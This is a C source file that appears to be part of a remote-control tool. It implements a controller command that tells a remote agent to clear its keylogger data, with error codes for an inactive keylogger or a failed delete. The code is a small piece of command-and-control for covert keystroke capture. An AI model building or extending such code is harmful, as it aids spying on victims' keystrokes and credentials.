#include <stdio.h>
#include <stdlib.h>
#include "server/serv_cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "logger.h"
#include "types.h"

#define SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NOT_ACTIVE 1
#define SERV_CMDS_KEYLOGGER_CLEAR_FAILED_DELETE 2
#define SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NEW_PATH 3

int serv_KEYLOGGER_CLEAR(void)
{
	if(net_SendEmptyCmd(SERV_CMDS_KEYLOGGER_CLEAR) < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	uint8* rmsg;

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		net_PrintLastError();
		
		return SERV_CMDS_BREAK;
	}

	if(rmsg[0] == SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NOT_ACTIVE)
	{
		LOG(LOG_ERR, "Keylogger is not active!\n");
	}else if(rmsg[0] == SERV_CMDS_KEYLOGGER_CLEAR_FAILED_DELETE){
		LOG(LOG_ERR, "Failed to delete data!\n");
		LOG(LOG_WAR, "Using old data file...\n");
	}else if(rmsg[0] == SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NEW_PATH){
		LOG(LOG_WAR, "Failed to get new path!\n");
		LOG(LOG_WAR, "Using old data file...\n");
	}else{
		putchar('\b');
	}

	free(rmsg);

	return SERV_CMDS_GOOD;
}